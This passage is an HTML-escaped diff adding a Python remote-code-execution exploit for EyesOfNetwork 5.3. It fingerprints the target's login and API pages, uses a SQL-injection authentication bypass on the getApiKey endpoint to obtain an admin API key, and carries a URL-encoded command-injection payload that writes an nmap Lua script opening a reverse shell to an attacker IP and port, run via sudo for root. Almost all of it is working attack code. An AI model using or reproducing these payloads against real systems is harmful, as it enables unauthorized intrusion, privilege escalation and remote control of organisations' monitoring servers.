+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;%3Becho+&lt;/span&gt;&lt;span class="si"&gt;%22lo&lt;/span&gt;&lt;span class="s1"&gt;cal+os+%3D+require+%5C&lt;/span&gt;&lt;span class="si"&gt;%22o&lt;/span&gt;&lt;span class="s1"&gt;s%5C%22+hostrule%3Dfunction&lt;/span&gt;&lt;span class="si"&gt;%28ho&lt;/span&gt;&lt;span class="s1"&gt;st%29+os.execute&lt;/span&gt;&lt;span class="si"&gt;%28%&lt;/span&gt;&lt;span class="s1"&gt;5C&lt;/span&gt;&lt;span class="si"&gt;%22%&lt;/span&gt;&lt;span class="s1"&gt;2Fbin&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;sh+-i+&lt;/span&gt;&lt;span class="si"&gt;%3E&lt;/span&gt;&lt;span class="s1"&gt;%26+&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;dev&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;tcp&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;+0&lt;/span&gt;&lt;span class="si"&gt;%3E%261%&lt;/span&gt;&lt;span class="s1"&gt;5C&lt;/span&gt;&lt;span class="si"&gt;%22%&lt;/span&gt;&lt;span class="s1"&gt;29+end+action%3Dfunction&lt;/span&gt;&lt;span class="si"&gt;%28%&lt;/span&gt;&lt;span class="s1"&gt;29+end%22+&lt;/span&gt;&lt;span class="si"&gt;%3E&lt;/span&gt;&lt;span class="s1"&gt;+&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;tmp&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;h4k%3Bsudo+&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;usr&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;bin&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;nmap+localhost+-p+1337+-script+&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;tmp&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;h4k+%23&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Exploit banner&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&amp;#34;&amp;#34;+-----------------------------------------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;| EyesOfNetwork 5.3 RCE                                                       |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;| 03/2020 - v1.1 - Clément Billac - &lt;/span&gt;&lt;span class="se"&gt;\033&lt;/span&gt;&lt;span class="s2"&gt;[01;34mTwitter: @h4knet&lt;/span&gt;&lt;span class="se"&gt;\033&lt;/span&gt;&lt;span class="s2"&gt;[00m                          |
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;+-----------------------------------------------------------------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Reverse shell info output&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_info&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Reverse shell: &amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;:&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_info&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;User to create: &amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;:&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new_pass&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Check if it&amp;#39;s a EyesOfNetwork login page.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;baseurl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user-agent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;useragent&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;title&amp;gt;EyesOfNetwork&amp;lt;/title&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;form action=&amp;#34;login.php&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_info&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;EyesOfNetwork login page found&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;EyesOfNetwork login page not found&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Check for accessible EON API&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;baseurl&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/eonapi/getApiKey&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user-agent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;useragent&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;401&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;api_version&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http_code&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_info&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;EyesOfNetwork API page found. API version: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;txt_bold&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;api_version&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_warn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;EyesOfNetwork API page not found&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# SQL injection with authentication bypass&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;baseurl&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/eonapi/getApiKey?&amp;amp;username=&lt;/span&gt;&lt;span class="si"&gt;%27%&lt;/span&gt;&lt;span class="s1"&gt;20union&lt;/span&gt;&lt;span class="si"&gt;%20s&lt;/span&gt;&lt;span class="s1"&gt;elect%201,&lt;/span&gt;&lt;span class="si"&gt;%27a&lt;/span&gt;&lt;span class="s1"&gt;dmin%27,&lt;/span&gt;&lt;span class="si"&gt;%271c&lt;/span&gt;&lt;span class="s1"&gt;85d47ff80b5ff2a4dd577e8e5f8e9d%27,0,0,1,1,8&lt;/span&gt;&lt;span class="si"&gt;%20o&lt;/span&gt;&lt;span class="s1"&gt;r&lt;/span&gt;&lt;span class="si"&gt;%20%&lt;/span&gt;&lt;span class="s1"&gt;27&amp;amp;password=h4knet&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user-agent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;useragent&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;EONAPI_KEY&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_success&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Admin user key obtained: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;EONAPI_KEY&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;The host seems patched or unexploitable&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_warn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Did you specified http instead of https in the URL ?&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;txt_warn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;You can check manually the SQLi with the following payload: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_bold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;/eonapi/getApiKey?username=&amp;#39; union select sleep(3),0,0,0,0,0,0,0 or &amp;#39;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;txt_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sep&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
